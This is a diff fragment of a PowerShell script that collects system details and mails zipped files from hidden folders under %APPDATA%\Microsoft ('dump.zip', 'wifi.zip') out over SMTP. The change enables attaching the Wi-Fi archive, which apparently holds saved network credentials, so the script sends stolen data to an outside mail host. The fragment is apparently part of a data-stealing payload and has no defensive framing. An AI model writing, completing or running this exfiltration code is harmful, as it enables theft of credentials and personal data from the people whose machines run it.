@@ -29,7 +29,7 @@ $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,M
 $Message.Body = $ComputerName
 #$files=Get-ChildItem 
 $Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
-#$Message.Attachments.Add("$env:appdata\Microsoft\wifi\wifi.zip")
+$Message.Attachments.Add("$env:appdata\Microsoft\wifi\wifi.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
